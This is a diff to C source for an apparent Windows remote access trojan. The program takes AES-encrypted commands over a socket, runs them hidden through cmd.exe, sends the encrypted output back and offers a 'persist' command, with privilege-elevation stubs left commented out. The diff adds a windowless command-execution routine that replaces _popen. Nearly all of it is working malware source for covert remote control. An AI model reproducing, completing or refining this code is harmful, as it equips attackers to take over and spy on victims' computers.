@@ -1,6 +1,3 @@
-#ifndef WIN32_LEAN_AND_MEAN
-#define WIN32_LEAN_AND_MEAN
-#endif
 #ifndef _CRT_SECURE_NO_WARNINGS
 #define _CRT_SECURE_NO_WARNINGS
 #endif
@@ -8,10 +5,6 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
 
 #include <windows.h>
-#include <winsock2.h>
-#include <ws2tcpip.h>
-#include <wininet.h>
-#include <winbase.h>
 #include <string.h>
 #include <stdlib.h>
 #include <stdio.h>
@@ -26,6 +19,7 @@
 
 #define SVPORT 8008
 #define CLPORT 8009
+#define BUFSIZE 4096
 
 // BOOL IsUserAdmin()
 // {
@@ -77,14 +71,12 @@ void sendall(int sockfd, unsigned char* buffer, size_t length)
     }
 }
 
-int encryptAES(unsigned char* plaintext, unsigned char* key, unsigned char* iv, unsigned char** ciphertext)
+int encryptAES(unsigned char* plaintext, int plaintextLen, unsigned char* key, unsigned char* iv, unsigned char** ciphertext)
 {
     EVP_CIPHER_CTX* ctx;
     int len;
-    int plaintextLen = strlen((const char*)plaintext);
     int ciphertextLen;
     int blkSize = 16;
-    int maxCipherLen = strlen(plaintext) + blkSize;
 
     ctx = EVP_CIPHER_CTX_new();
     EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
@@ -116,8 +108,6 @@ int decryptAES(unsigned char* ciphertext, int ciphertextLen, unsigned char* key,
 
     return plaintextLen;
 }
-
-
 
 // void ELEVATE()
 // {
@@ -160,6 +150,72 @@ int decryptAES(unsigned char* ciphertext, int ciphertextLen, unsigned char* key,
 //     CloseHandle(pi.hProcess);
 //     CloseHandle(pi.hThread);
 // }
+
+char* ExecuteCommand(char* command, size_t* resultLen)
+{
+    SECURITY_ATTRIBUTES sa;
+	memset(&sa, 0, sizeof(sa));
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+	sa.lpSecurityDescriptor = NULL;
+	sa.bInheritHandle = TRUE;
+
+	HANDLE hStdOutRd, hStdOutWr;
+	HANDLE hStdErrRd, hStdErrWr;
+
+	CreatePipe(&hStdOutRd, &hStdOutWr, &sa, 0);
+	CreatePipe(&hStdErrRd, &hStdErrWr, &sa, 0);
+
+	SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
+    SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);
+
+    STARTUPINFO si;
+    memset(&si, 0, sizeof(si));
+	si.cb = sizeof(STARTUPINFO);
+    si.dwFlags |= STARTF_USESTDHANDLES;
+	si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);
+    si.hStdOutput = hStdOutWr;
+	si.hStdError = hStdOutWr;
+
+    PROCESS_INFORMATION pi;
+	memset(&pi, 0, sizeof(pi));
+
+    char fullCmdLine[BUFSIZE];
+    snprintf(fullCmdLine, BUFSIZE, "cmd.exe /c %s", command);
+
+    wchar_t wCmdLine[BUFSIZE];
+    mbstowcs(wCmdLine, fullCmdLine, BUFSIZE);
+
+    BOOL bSuccess = CreateProcessW(NULL, wCmdLine, NULL, NULL, TRUE, HIGH_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
+
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+	CloseHandle(hStdOutWr);
+
+    //Read from pipe
+	char buffer[BUFSIZE + 1] = { 0 };
+    DWORD dwRead = 0;
+    size_t totalSize = 1;
+    char* result = malloc(1);
+	memset(result, 0, totalSize);
+    BOOL success = FALSE;
+
+	success = ReadFile(hStdOutRd, buffer, BUFSIZE, &dwRead, NULL);
+    while (success == TRUE)
+    {
+		buffer[dwRead] = '\0';
+		totalSize += dwRead;
+        result = realloc(result, totalSize);
+		strcat(result, buffer);
+		success = ReadFile(hStdOutRd, buffer, BUFSIZE, &dwRead, NULL);
+    }
+    *resultLen = totalSize;
+
+    CloseHandle(hStdOutRd);
+    CloseHandle(hStdErrRd);
+    CloseHandle(hStdErrWr);
+
+    return result;
+}
 
 void PERSIST()
 {
@@ -214,57 +270,41 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
     recv(sockfd, aes_key, sizeof(aes_key), 0);
 
     char recvBuffer[1025];
-    char container[1025];
-    char resBuffer[524289];
-
     while (1)
     {
         memset(recvBuffer, 0, sizeof(recvBuffer));
-        memset(container, 0, sizeof(container));
-        memset(resBuffer, 0, sizeof(resBuffer));
 
-        char recvAESLen[10];
-        recvAESLen[10 - 1] = '\0';
-        recv(sockfd, recvAESLen, sizeof(recvAESLen), 0);
+        char recvCiphertextLen[10];
+        recvCiphertextLen[10 - 1] = '\0';
+        recv(sockfd, recvCiphertextLen, sizeof(recvCiphertextLen), 0);
 
-        int aesCiphertextLen = atoi(recvAESLen);
+        int ciphertextCommandLen = atoi(recvCiphertextLen);
 
-        unsigned char* recvAESText = malloc(aesCiphertextLen + EVP_MAX_IV_LENGTH);
-        int recvAESTextLen = aesCiphertextLen + EVP_MAX_IV_LENGTH;
+        unsigned char* recvAESText = malloc(ciphertextCommandLen + EVP_MAX_IV_LENGTH);
+        int recvAESTextLen = ciphertextCommandLen + EVP_MAX_IV_LENGTH;
         recv(sockfd, (char*)recvAESText, recvAESTextLen, 0);
 
         unsigned char iv[EVP_MAX_IV_LENGTH];
-        unsigned char* aesCiphertext = malloc(aesCiphertextLen);
-        memcpy(aesCiphertext, recvAESText, aesCiphertextLen);
-        memcpy(iv, recvAESText + aesCiphertextLen, EVP_MAX_IV_LENGTH);
+        unsigned char* aesCiphertext = malloc(ciphertextCommandLen);
+        memcpy(aesCiphertext, recvAESText, ciphertextCommandLen);
+        memcpy(iv, recvAESText + ciphertextCommandLen, EVP_MAX_IV_LENGTH);
 
-        unsigned char* aesPlaintext = malloc(aesCiphertextLen);
-        int aesPlaintextLen = decryptAES(aesCiphertext, aesCiphertextLen, aes_key, iv, &aesPlaintext);
-        aesPlaintext[aesPlaintextLen] = '\0';
+        unsigned char* plaintextCommand = malloc(ciphertextCommandLen + EVP_MAX_BLOCK_LENGTH);
+        int plaintextCommandLen = decryptAES(aesCiphertext, ciphertextCommandLen, aes_key, iv, &plaintextCommand);
+        plaintextCommand[plaintextCommandLen] = '\0';
 
         free(aesCiphertext);
-        if (strncmp(aesPlaintext, "persist", strlen("persist") == 0))
+        if (strncmp(plaintextCommand, "persist", strlen("persist") == 0))
         {
             PERSIST();
-            free(aesPlaintext);
-            free(recvAESText);
         }
         else
         {
-            FILE* fp = _popen(aesPlaintext, "r");
+			size_t resultLen = 0;
+            char* result = ExecuteCommand(plaintextCommand, &resultLen);
 
-            container[sizeof(container) - 1] = '\0';
-            while (fgets(container, sizeof(container), fp) != NULL)
-            {
-                strncat(resBuffer, container, sizeof(container));
-            }
-            _pclose(fp);
-
-            resBuffer[sizeof(resBuffer) - 1] = '\0';
-            printf("%s\n", resBuffer);
-
-            unsigned char* sendCiphertext = malloc(strlen(resBuffer) + 16);
-            int sendCiphertextLen = encryptAES(resBuffer, aes_key, iv, &sendCiphertext);
+            unsigned char* sendCiphertext = malloc(resultLen + 16);
+            int sendCiphertextLen = encryptAES(result, resultLen, aes_key, iv, &sendCiphertext);
 
             char sendAESLen[10];
             sendAESLen[10 - 1] = '\0';
@@ -273,9 +313,10 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lCmdLin
             Sleep(100);
             sendall(sockfd, sendCiphertext, sendCiphertextLen);
 
-            free(aesPlaintext);
-            free(sendCiphertext);
+			free(result);
+            free(plaintextCommand);
             free(recvAESText);
+            free(sendCiphertext);
         }
     }
     return 0;
